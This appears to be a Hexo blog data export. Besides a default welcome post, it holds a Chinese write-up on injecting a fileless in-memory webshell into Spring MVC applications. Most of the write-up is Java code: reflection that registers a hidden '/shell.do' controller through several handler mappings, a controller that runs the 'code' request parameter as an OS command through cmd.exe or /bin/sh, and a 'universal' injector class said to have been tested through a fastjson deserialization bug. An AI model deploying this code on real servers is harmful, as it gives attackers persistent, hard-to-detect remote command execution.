{"pages":[],"posts":[{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","link":"/2021/11/15/hello-world/"},{"title":"java Spring 无文件getshell","text":"SpringMVC 全版本通用无文件webshell1. 前言java 反序列化漏洞经常会遇到不出网而无法回显的情况，所以我们可能通过通过内存马的方式注入一个shell. spring MVC中有两个重要的配置：ContextLoaderListener 与 DispatcherServlet。spring MVC 一般是有2个 WebApplicationContext ，一个是parent，从 applicationContext.xml里加载的 另一个是child，从dispatcher-servlet.xml中加载。 其中root WebApplicationContext是通过web.xml中的listener初始化的，child WebApplicationContext是通过servlet初始化的。 12345&lt;listener&gt; &lt;listener-class&gt; org.springframework.web.context.request.RequestContextListener &lt;/listener-class&gt;&lt;/listener&gt; 两者是继承关系，而且root的bean是可以被child拿到，而child的bean root是拿不到的。这样的设计可能会导致一些混乱，所以官方的建议是applicationContext.xml里通常只component-scan非Controller的类，而dispatcher-servlet.xml只 component-scan Controller类 。 综上我们最好获得的是child WebApplicationContext applicationContext.xml(只扫描非Controller类) 12345&lt;context:component-scan base-package=&quot;com.vvings.Controller&quot; use-default-filters=&quot;false&quot; &gt; &lt;context:exclude-filter type=&quot;annotation&quot; expression=&quot;org.springframework.stereotype.Controller&quot; /&gt;&lt;/context:component-scan&gt; dispatcher-servlet.xml(只扫描Controller类) 1234&lt;context:component-scan base-package=&quot;com.vvings.Controller&quot; use-default-filters=&quot;false&quot;&gt; &lt;context:include-filter expression=&quot;org.springframework.stereotype.Controller&quot; type=&quot;annotation&quot; /&gt;&lt;/context:component-scan&gt; 2. 获取Context root WebApplicationContext的创建过程 首先Context是由serverContext为基础创建的。而 FrameworkServlet 是SpringMVC最基础的 Servlet 。通过查看它的源码我们可以看见WebApplicationContext的创建过程 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253protected WebApplicationContext initWebApplicationContext() { WebApplicationContext rootContext = WebApplicationContextUtils.getWebApplicationContext(getServletContext()); WebApplicationContext wac = null; if (this.webApplicationContext != null) { // A context instance was injected at construction time -&gt; use it wac = this.webApplicationContext; if (wac instanceof ConfigurableWebApplicationContext) { ConfigurableWebApplicationContext cwac = (ConfigurableWebApplicationContext) wac; if (!cwac.isActive()) { // The context has not yet been refreshed -&gt; provide services such as // setting the parent context, setting the application context id, etc if (cwac.getParent() == null) { // The context instance was injected without an explicit parent -&gt; set // the root application context (if any; may be null) as the parent cwac.setParent(rootContext); } configureAndRefreshWebApplicationContext(cwac); } } } if (wac == null) { // No context instance was injected at construction time -&gt; see if one // has been registered in the servlet context. If one exists, it is assumed // that the parent context (if any) has already been set and that the // user has performed any initialization such as setting the context id wac = findWebApplicationContext(); } if (wac == null) { // No context instance is defined for this servlet -&gt; create a local one wac = createWebApplicationContext(rootContext); } if (!this.refreshEventReceived) { // Either the context is not a ConfigurableApplicationContext with refresh // support or the context injected at construction time had already been // refreshed -&gt; trigger initial onRefresh manually here. onRefresh(wac); } if (this.publishContext) { // Publish the context as a servlet context attribute. String attrName = getServletContextAttributeName(); getServletContext().setAttribute(attrName, wac); if (this.logger.isDebugEnabled()) { this.logger.debug(&quot;Published WebApplicationContext of servlet '&quot; + getServletName() + &quot;' as ServletContext attribute with name [&quot; + attrName + &quot;]&quot;); } } return wac; } 首先 Spring提供的工具类 WebApplicationContextUtils 获取Spring 的root Context ，而这个root Context由ContextLoader 创建的。它通过搜索ServletContext中的是否存在`ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE` Attribute，来判断是否已经创建了root Context.而ContextLoader 在创建时就会被存储在 ServletContext 中。 ContextLoader 通过上文我们可以知道，ContextLoader 是创建root Context 的主要工具类。而他也有一个 getCurrentWebApplicationContext 方法可以直接获取root Context 1WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext(); WebApplicationContextUtils 在FrameworkServlet 初始化WebApplicationContext时。获取了从ContextLoader创建的WebApplicationContext。用了该方法 所以只需获取到一个ServletContext实例即可， 通过ContextLoader获取一个ServletContext 123ServletContext servletContext = ContextLoader.getCurrentWebApplicationContext().getServletContext();WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(servletContext); 通过requests获取.也就是从 RequestContextHolder 中获取当前的ServletContext 1234567RequestAttributes requestAttributes = RequestContextHolder.currentRequestAttributes();HttpServletRequest request = ((ServletRequestAttributes) requestAttributes).getRequest();ServletContext servletContext = request.getServletContext();WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(servletContext); getAttribute 前面提到 WebApplicationContext 被会存储在ServletContext中。那么我们直接将他取出来即可。 1WebApplicationContext context = (WebApplicationContext) servletContext.getAttribute(&quot;org.springframework.web.context.WebApplicationContext.ROOT&quot;); 3. dispatcher-servlet.xml前面提到过Context之间是有继承关系的。且root Context 不能拿到child Context 的bean。如果我们获取的是root，那么在下一步获取Url映射器时就可能出现获取不到的情况。因为注解`&lt;mvc:annotation-driven/&gt;` 可能会被写在child Context也就是 dispatcher-servlet.xml 中 那么我们最好获取dispatcher-servlet.xml生成的Context。 DispatcherServlet加载的Context在每次请求时会放一份在request对象的key为 WEB_APPLICATION_CONTEXT_ATTRIBUTE 属性中. 所以我们可以从直接request中获取到 12WebApplicationContext context = (WebApplicationContext) request.getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;); 4. 手工注册Controller在 Spring 3.1 之前一般使用的 DefaultAnnotationHandlerMapping 映射器 在 Spring 3.1之后一般使用 RequestMappingHandlerMapping BeanNameUrlHandlerMapping 和 SimpleUrlHandlerMapping 通过在DispatcherServlet中的initHandlerMappings方法 可以看的DispatcherServlet会默认的加载DispatcherServlet.properties中的HandlerMapping 在spring 5.0 之前 这两个默认handlerMapping是 DefaultAnnotationHandlerMapping 和 BeanNameUrlHandlerMapping 而在 5.0之后才是 RequestMappingHandlerMapping 和` BeanNameUrlHandlerMapping 。 但是在实际的测试中确实是 RequestMappingHandlerMapping BeanNameUrlHandlerMapping 。希望有知道的师傅能告知一下。。。 12345ApplicationContext context = new ClassPathXmlApplicationContext(&quot;classpath:applicationContext.xml&quot;); String[] str = context.getBeanDefinitionNames(); for (String string : str) { System.out.println(&quot;bean: &quot; + string);} registerMapping 在Spring 4.0 之后， 可以直接使用 registerMapping 直接注册 requestMapping 12345Method method = (Class.forName(&quot;vvings.controller.shell&quot;).getDeclaredMethods())[0];PatternsRequestCondition url = new PatternsRequestCondition(&quot;/shell.do&quot;);RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);r.registerMapping(info, Class.forName(&quot;vvings.controller.shell&quot;).newInstance(), method); 对于使用 DefaultAnnotationHandlerMapping 映射器的spring。找到 找到顶部实现类 AbstractUrlHandlerMapping 中注册URL的 registerHandler 方法。这是Handler给URl注册的核心代码。 123456789101112131415161718protected void registerHandler(String urlPath, Object handler) throws BeansException, IllegalStateException { Assert.notNull(urlPath, &quot;URL path must not be null&quot;); Assert.notNull(handler, &quot;Handler object must not be null&quot;); Object resolvedHandler = handler; // Eagerly resolve handler if referencing singleton via name. if (!this.lazyInitHandlers &amp;&amp; handler instanceof String) { String handlerName = (String) handler; if (getApplicationContext().isSingleton(handlerName)) { resolvedHandler = getApplicationContext().getBean(handlerName); } } Object mappedHandler = this.handlerMap.get(urlPath); ... } 那么我们通过反射调用这个方法即可 123456ConfigurableApplicationContext applicationContext = (ConfigurableApplicationContext) context; applicationContext.getBeanFactory().registerSingleton(&quot;shell&quot;, Class.forName(&quot;vvings.dao.shell&quot;).newInstance());//注册Controller DefaultAnnotationHandlerMapping defaultAnnotationHandlerMapping = (DefaultAnnotationHandlerMapping) context.getBean(&quot;org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping&quot;); Method m1 = Class.forName(&quot;org.springframework.web.servlet.handler.AbstractUrlHandlerMapping&quot;).getDeclaredMethod(&quot;registerHandler&quot;, String.class, Object.class); m1.setAccessible(true); m1.invoke(defaultAnnotationHandlerMapping, &quot;/shell.do&quot;, &quot;shellController&quot;); 对于使用 RequestMappingHandlerMapping 映射器的spring 由于RequestsMappingHandlerMapping是基于方法级别设计的。找到 AbstractHandlerMethodMapping 中的 detectHandlerMethods方法 1234567891011121314151617181920212223242526272829303132//在指定的Handler的bean中查找Methods 找到就注册进去：mappingRegistryprotected void detectHandlerMethods(final Object handler) { Class&lt;?&gt; handlerType = (handler instanceof String ? getApplicationContext().getType((String) handler) : handler.getClass()); final Class&lt;?&gt; userType = ClassUtils.getUserClass(handlerType); Map&lt;Method, T&gt; methods = MethodIntrospector.selectMethods(userType, new MethodIntrospector.MetadataLookup&lt;T&gt;() { @Override public T inspect(Method method) { try { //getMappingForMethod属于一个抽象方法，由实现类去决定它的寻找规则 什么才算作一个hanler Method return getMappingForMethod(method, userType); } catch (Throwable ex) { throw new IllegalStateException(&quot;Invalid mapping on handler class [&quot; + userType.getName() + &quot;]: &quot; + method, ex); } } }); if (logger.isDebugEnabled()) { logger.debug(methods.size() + &quot; request handler methods found on &quot; + userType + &quot;: &quot; + methods); } //遍历方法 一一的注册 for (Map.Entry&lt;Method, T&gt; entry : methods.entrySet()) { Method invocableMethod = AopUtils.selectInvocableMethod(entry.getKey(), userType); T mapping = entry.getValue(); registerHandlerMethod(handler, invocableMethod, mapping); } } 那么使用方法跟上一个查不多 1234RequestMappingHandlerMapping requestMappingHandlerMapping = (RequestMappingHandlerMapping) applicationContext.getBean(&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;);Method m1 = Class.forName(&quot;org.springframework.web.servlet.handler.AbstractUrlHandlerMapping&quot;).getDeclaredMethod(&quot;registerHandler&quot;, String.class, Object.class);m1.setAccessible(true);m1.invoke(defaultAnnotationHandlerMapping, &quot;/shell.do&quot;, &quot;shellController&quot;); 使用BeanNameUrlHandlerMapping 映射器 前面我们提到过 在spring中会默认加载两个映射器，其中的BeanNameUrlHandlerMapping 3.1之前 会被 DispatcherServlet默认创建一个BeanNameUrlHandlerMapping 。在3.1之后会被默认注入 12345678910111213141516 //注册bean 名字以/开始 ConfigurableApplicationContext applicationContext = (ConfigurableApplicationContext) context; applicationContext.getBeanFactory().registerSingleton(&quot;/shell.do&quot;, Class.forName(&quot;vvings.dao.shell&quot;).newInstance()); //将bean写入url列表 BeanNameUrlHandlerMapping beanNameUrlHandlerMapping = (BeanNameUrlHandlerMapping) context1.getBean(&quot;org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping&quot;); Method m1 = BeanNameUrlHandlerMapping.class.getDeclaredMethod(&quot;determineUrlsForHandler&quot;, String.class); //将url注册进handler m2.setAccessible(true); m2.invoke(beanNameUrlHandlerMapping, &quot;/shell.do&quot;); Method m1 = Class.forName(&quot;org.springframework.web.servlet.handler.AbstractDetectingUrlHandlerMapping&quot;).getDeclaredMethod(&quot;detectHandlers&quot;); m1.setAccessible(true);m1.invoke(beanNameUrlHandlerMapping); 但是同是Controller的写法要改变，不然会爆找不到adapter的错误。 123456789101112131415161718192021222324252627282930 public class shell implements Controller { //这是Controller是 import org.springframework.web.servlet.mvc.Controller; //并不是注解的那个。。被搞了好久的心态 @Override public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response) throws Exception { try { String arg0 = request.getParameter(&quot;code&quot;); PrintWriter writer = response.getWriter(); if (arg0 != null) { String o = &quot;&quot;; ProcessBuilder p; if (System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;)) { p = new ProcessBuilder(new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, arg0}); } else { p = new ProcessBuilder(new String[]{&quot;/bin/sh&quot;, &quot;-c&quot;, arg0}); } java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(&quot;\\\\A&quot;); o = c.next(); writer.write(o); writer.flush(); writer.close(); return null; } else { response.sendError(404); } } catch (Exception e) { } return null; }} 5. 总结最后给出一个通用吧 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import org.springframework.context.ConfigurableApplicationContext;import org.springframework.web.context.ContextLoader;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.servlet.ModelAndView;import org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping;import org.springframework.web.servlet.mvc.Controller;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;/** * @author vvings * @version 2020/3/15 23:15 */public class shell implements Controller { static { WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext(); ConfigurableApplicationContext applicationContext = (ConfigurableApplicationContext) context; try { applicationContext.getBeanFactory().registerSingleton(&quot;beanNameUrlHandlerMapping&quot;, Class.forName(&quot;org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping&quot;).newInstance()); applicationContext.getBeanFactory().registerSingleton(&quot;/shell.do&quot;, Class.forName(&quot;vvings.dao.shell&quot;).newInstance()); } catch (InstantiationException e) { e.printStackTrace(); } catch (IllegalAccessException e) { e.printStackTrace(); } catch (ClassNotFoundException e) { e.printStackTrace(); } BeanNameUrlHandlerMapping beanNameUrlHandlerMapping = (BeanNameUrlHandlerMapping) context.getBean(&quot;beanNameUrlHandlerMapping&quot;); try { Method m2 = BeanNameUrlHandlerMapping.class.getDeclaredMethod(&quot;determineUrlsForHandler&quot;, String.class); m2.setAccessible(true); m2.invoke(beanNameUrlHandlerMapping, &quot;/shell.do&quot;); Method m1 = Class.forName(&quot;org.springframework.web.servlet.handler.AbstractDetectingUrlHandlerMapping&quot;).getDeclaredMethod(&quot;detectHandlers&quot;); m1.setAccessible(true); m1.invoke(beanNameUrlHandlerMapping); } catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException | ClassNotFoundException e) { e.printStackTrace(); } } @Override public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response) throws Exception { //yourShell return null; }} spring可以实现无文件getshell。那么tomcat，weblogic也可以这也实现。 tomcat好像已经搞出来了 。接下来会了解一下。随便学习一下weblogic，看能不能有点想法。 环境： jdk:18u102 spring:3.0.0/4.1.13 另利用fastjson反序列化漏洞进行测试成功","link":"/2021/11/15/java-Spring-%E6%97%A0%E6%96%87%E4%BB%B6getshell/"}],"tags":[],"categories":[]}